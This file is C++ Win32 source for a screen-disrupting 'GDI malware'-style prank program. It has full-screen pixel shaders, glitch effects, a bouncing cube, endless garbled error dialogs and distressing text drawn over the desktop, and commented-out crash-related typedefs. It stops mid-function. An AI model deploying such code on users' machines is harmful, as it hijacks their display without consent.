#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
    srand(GetTickCount());
    WCHAR string[32];
    for (int i = 0; i < 32; i++) {
        string[i] = (WCHAR)(rand() % 256) + 1;
    }
    return string;
}

HWND hDlg;
HANDLE glitchmsgbox1;
int MessageBoxWidth, MessageBoxHeight;
BOOL AlreadyStartGlitch = false;

HHOOK hHook = NULL;
BOOL CALLBACK EnumProc114(HWND hWnd, LPARAM lParam) {
    SetWindowTextA(hWnd, "");
    ShowWindow(hWnd, 0);
    EnableWindow(hWnd, FALSE);
    return 1;
}

DWORD WINAPI msgglitch(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(hDlg);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), MessageBoxWidth, MessageBoxHeight, 1, 32 };
        PRGBQUAD rgbScreen = { 0 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, MessageBoxWidth, MessageBoxHeight, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < MessageBoxWidth * MessageBoxHeight; i++) {
            int luckynum = rand() % 30;
            if (luckynum <= 10) { rgbScreen[i].rgb = 0; }
            else if (luckynum > 10 && luckynum <= 20) { rgbScreen[i].rgb = 7237230; }
            else { rgbScreen[i].rgb = 14474460; }
        }
        for (int x = 0; x < MessageBoxWidth; x += 50) {
            for (int y = 0; y < MessageBoxHeight; y += 50) {
                StretchBlt(hcdc, x, y, 50, 50, hcdc, x, y, 25, 25, SRCCOPY);
            }
        }
        BitBlt(hdc, 0, 0, MessageBoxWidth, MessageBoxHeight, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10);
    }
}

LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE) {
        if (AlreadyStartGlitch == true) { return 114514; }
        AlreadyStartGlitch = true;
        hDlg = (HWND)wParam;
        RECT rect;
        GetWindowRect(hDlg, &rect);
        MessageBoxWidth = rect.right - rect.left;
        MessageBoxHeight = rect.bottom - rect.top;
        EnumChildWindows(hDlg, EnumProc114, 0);
        glitchmsgbox1 = CreateThread(0, 0, msgglitch, 0, 0, 0);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI msg(LPVOID lpParam) {
    while (true) {
        hHook = SetWindowsHookEx(WH_CBT, &CBTProc, NULL, GetCurrentThreadId());
        MessageBoxA(NULL, "", "A?", MB_ICONERROR | MB_ABORTRETRYIGNORE | MB_TOPMOST);
        if (hHook != NULL) { UnhookWindowsHookEx(hHook); }
        AlreadyStartGlitch = false;
        TerminateThread(glitchmsgbox1, 0);
        CloseHandle(glitchmsgbox1);
        Sleep(10);
    }
    return 0;
}

struct Point3D {
    float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, int color) {
    HBRUSH hBrush = CreateSolidBrush(color);
    SelectObject(hdc, hBrush);
    Ellipse(hdc, x - 10, y - 10, x + 20, y + 20);
    DeleteObject(hBrush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
    float cosX = cos(angleX), sinX = sin(angleX);
    float cosY = cos(angleY), sinY = sin(angleY);
    float cosZ = cos(angleZ), sinZ = sin(angleZ);
    float y = point.y * cosX - point.z * sinX;
    float z = point.y * sinX + point.z * cosX;
    point.y = y; point.z = z;
    float x = point.x * cosY + point.z * sinY;
    z = -point.x * sinY + point.z * cosY;
    point.x = x; point.z = z;
    x = point.x * cosZ - point.y * sinZ;
    y = point.x * sinZ + point.y * cosZ;
    point.x = x; point.y = y;
    return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA, float color) {
    Point3D vertices[8] = {
        {-size, -size, -size}, {size, -size, -size},
        {size, size, -size}, {-size, size, -size},
        {-size, -size, size}, {size, -size, size},
        {size, size, size}, {-size, size, size},
    };
    POINT screenPoints[8];
    for (int i = 0; i < 8; ++i) {
        Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
        int screenX = static_cast<int>(center.x + rotated.x);
        int screenY = static_cast<int>(center.y + rotated.y);
        screenPoints[i].x = screenX;
        screenPoints[i].y = screenY;
        DrawEllipseAt(hdc, screenX, screenY, color);
    }
    POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
    Polyline(hdc, polyline1, 5);
    POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
    Polyline(hdc, polyline2, 5);
    POINT connectingLines[8] = {
        screenPoints[0], screenPoints[4],
        screenPoints[1], screenPoints[5],
        screenPoints[2], screenPoints[6],
        screenPoints[3], screenPoints[7]
    };
    Polyline(hdc, &connectingLines[0], 2);
    Polyline(hdc, &connectingLines[2], 2);
    Polyline(hdc, &connectingLines[4], 2);
    Polyline(hdc, &connectingLines[6], 2);
}

DWORD WINAPI cube(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int wdpi = GetDeviceCaps(hdc, 88);
    int hdpi = GetDeviceCaps(hdc, 90);
    ReleaseDC(0, hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int x = w * wdpi / 96;
    int y = h * hdpi / 96;
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    float x2 = 100.0;
    float y2 = 100.0;
    float angleX = 0.0, angleY = 0.0, angleZ = 0.0;
    float angleIncrement = 0.04;
    float colorA = 0;
    float size = 100;
    while (true) {
        hdc = GetDC(0);
        x2 += incrementor * signX;
        y2 += incrementor * signY;
        if (x2 + 75 >= x) {
            signX = -1; x2 = x - 76;
        }
        else if (x2 <= 75) {
            signX = 1; x2 = 76;
        }
        if (y2 + 75 >= y) {
            signY = -1; y2 = y - 76;
        }
        else if (y2 <= 75) {
            signY = 1; y2 = 76;
        }
        Point3D center = { x2, y2, 0.0f };
        int color = Hue(239);
        HPEN hPen = CreatePen(0, 8, color);
        SelectObject(hdc, hPen);
        Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA, color);
        ReleaseDC(0, hdc);
        DeleteObject(hPen);
        DeleteDC(hdc);
        angleX += angleIncrement;
        angleY += angleIncrement;
        angleZ += angleIncrement;
        Sleep(10);
        colorA += 1;
        if (size >= 0 && size <= 100) {
            size += 0.5;
        }
    }
    return 0;
}

DWORD WINAPI icons(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI cur1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        LPCWSTR lpCursors[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
        int CursorCount = rand() % 16;
        DrawIconEx(hdc, rand() % sw, rand() % sh, LoadCursor(0, lpCursors[CursorCount]), (rand() % 10 + 1) * GetSystemMetrics(11), (rand() % 10 + 1) * GetSystemMetrics(12), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI warning(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int radius = 110, angle = 0, count = 0;
    int sx = 1, sy = 1, x = 10, y = 10;;
    int incrementor = 1;
    while (true) {
        x += (incrementor * sx);
        y += (incrementor * sy);
        HICON hIcon = LoadIcon(0, IDI_WARNING);
        HDC hdc = GetDC(0);
        DrawIcon(hdc, x + (radius * cos(angle * M_PI / 18)), y + (radius * sin(angle * M_PI / 18)), hIcon);
        ReleaseDC(0, hdc);
        DestroyIcon(hIcon);
        DeleteObject(hIcon);
        DeleteDC(hdc);
        if (y >= h) { sy = -1; }
        if (x >= w) { sx = -1; }
        if (y <= 0) { sy = 1; }
        if (x <= 0) { sx = 1; }
        angle++;
        if (count == 10) {
            count = 0;
            Sleep(10);
        }
        else {
            count++;
        }
    }
}

DWORD WINAPI textout(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        LPCSTR text[12] = {
            "paramecium2", ":(", "suffer", "where am I?",
            "I can't breathe", "is anyone here?",
            "I feel lonely and NOT safe", "please let me out...",
            "I don't want to die", "is this my end?",
            "I'm losing control", "this is NOT funny"
        };
        int thing = rand() % 12;
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(50, 30, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, text[thing], strlen(text[thing]));
        ReleaseDC(0, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(100);
    }
}

DWORD WINAPI shell32(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HINSTANCE lib = LoadLibraryA("shell32.dll");
        DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(lib, MAKEINTRESOURCE(rand() % 2048)), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader1(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                rgbquad[index].rgbRed = (i | x & i | y) + i;
                rgbquad[index].rgbGreen = (i ^ x | i + y) + i;
                rgbquad[index].rgbBlue = (i | x & i ^ y) + i;
            }
        }
        for (int bl = 0; bl < h; bl += 1) {
            StretchBlt(hcdc, -2 + rand() % 5, bl, w, 1, hcdc, 0, bl, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        i += 2;
    }
}

DWORD WINAPI shader2(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].r = -((i * x) * (i | y) + w * xxx * 2) / 128;
            rgbScreen[i].g = ((i * x) | (i ^ x) + w * xxx * 3) / 256;
            rgbScreen[i].b = ((i * y) >> (i | y) + w * xxx * 4) / 512;
        }
        xxx++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* pBits = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w; i++) {
            StretchBlt(hcdc, i, -2 + (rand() % 5), 1, h, hcdc, i, 0, 1, h, SRCCOPY);
        }
        for (int i = 0; i < h; i++) {
            StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x + y * w;
                double wave = sin((x + xxx) * 0.04) + cos((y + xxx) * 0.04);
                pBits[index].rgbRed += (256 * sin(wave) * 0.6);
                pBits[index].rgbGreen += (256 * cos(wave) * 0.6);
                pBits[index].rgbBlue += (256 * sin(wave) * 0.6);
            }
        }
        BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx += 4;
    }
}

DWORD WINAPI shader4(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int rndrgb = RGB(rand() % 255, rand() % 255, rand() % 255);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].rgb ^= (rgbScreen[i].rgb + rand() % int(cbrt(i + (x ^ y) + 11))) % (rndrgb);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
}

DWORD WINAPI shader5(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y;
                int fx = ((y + (5 * i)) ^ x) + (i * 5);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += fmod(fx / 500.f + y / h * .2f, 1.f);
                hslcolor.s = 1.f;  hslcolor.l += 0.9f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i++;
    }
}

DWORD WINAPI shader6(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int cxk = sqrt((float)(rgbScreen[i].r ^ rgbScreen[i].g ^ rgbScreen[i].b));
            rgbScreen[i].r = xxx + (y + cxk);
            rgbScreen[i].g = xxx + (y + cxk);
            rgbScreen[i].b = xxx + (x + cxk);
        }
        for (int bl = 0; bl < h; bl += 1) {
            StretchBlt(hcdc, -2 + rand() % 5, bl, w, 1, hcdc, 0, bl, w, 1, SRCCOPY);
        }
        BLENDFUNCTION blur = { AC_SRC_OVER, 0, 60, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx += 10;
    }
}

DWORD WINAPI shader7(LPVOID lpParam) {
    int i = 0;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((x - i) ^ (y - i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 114.5 + y / static_cast<float>(h) * 1.14, 1.f);
                hslcolor.s += fmod((x % 5) / 100.f, 1.f);
                hslcolor.l += fmod((y % 10) / 200.f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int x = 0; x < w; x++) {
            StretchBlt(hcdc, x, -4 + rand() % 9, 1, h, hcdc, x, 0, 1, h, SRCCOPY);
        }
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -4 + rand() % 9, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        i += 5;
    }
}

DWORD WINAPI shader8(LPVOID lpParam) {
    RGBQUAD rgbquadCopy;
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y;
                int fx = (int)((i ^ 2) + (i * 2) * cbrt(i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 500.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int bl = 0; bl < h; bl += 1) {
            StretchBlt(hcdc, -2 + rand() % 5, bl, w, 1, hcdc, 0, bl, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i++;
    }
}

DWORD WINAPI gaussian(LPVOID lpParam) {
    double angle = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int x = sin(angle) * 4, y = cos(angle) * 4;
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, x, y, w, h, hdc, 0, 0, SRCCOPY);
        BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        angle += M_PI / 10;
    }
}

DWORD WINAPI shader9(LPVOID lpParam) {
    int i = 0, blocksize = 100;
    RGBQUAD rgbquadCopy;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int rndw = 1 + rand() % (w / 2);
        int rndh = 1 + rand() % (h / 2);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, rand() % 8, rand() % 8, w, h, hcdc, rand() % 8, rand() % 8, SRCCOPY);
        for (int x = 0; x < w; x += rndw) {
            StretchBlt(hcdc, x, -1 + rand() % 3, rndw, h, hcdc, x, 0, rndw, h, SRCCOPY);
        }
        for (int y = 0; y < h; y += rndh) {
            StretchBlt(hcdc, -1 + rand() % 3, y, w, rndh, hcdc, 0, y, w, rndh, SRCCOPY);
        }
        for (int x = 0; x <= w; x += blocksize) {
            for (int y = 0; y <= h; y += blocksize) {
                int rndx = x + (-1 + rand() % 3);
                int rndy = y + (-1 + rand() % 3);
                int rndx2 = x + (-1 + rand() % 3);
                int rndy2 = y + (-1 + rand() % 3);
                StretchBlt(hcdc, rndx, rndy, blocksize, blocksize, hcdc, rndx2, rndy2, blocksize, blocksize, SRCCOPY);
            }
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (x + i * 10) ^ (y + i * 2);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 150.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i += 2;
    }
    return 0;
}

DWORD WINAPI shader10(LPVOID lpParam) {
    int i = 0, xxx = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = w * y + x;
                int fx = (int)(((x * xxx) & (y * xxx) & (x - xxx) ^ y));
                rgbquad[index].rgbRed = fx + i;
                rgbquad[index].rgbGreen = fx + i;
                rgbquad[index].rgbBlue = fx + i;
            }
        }
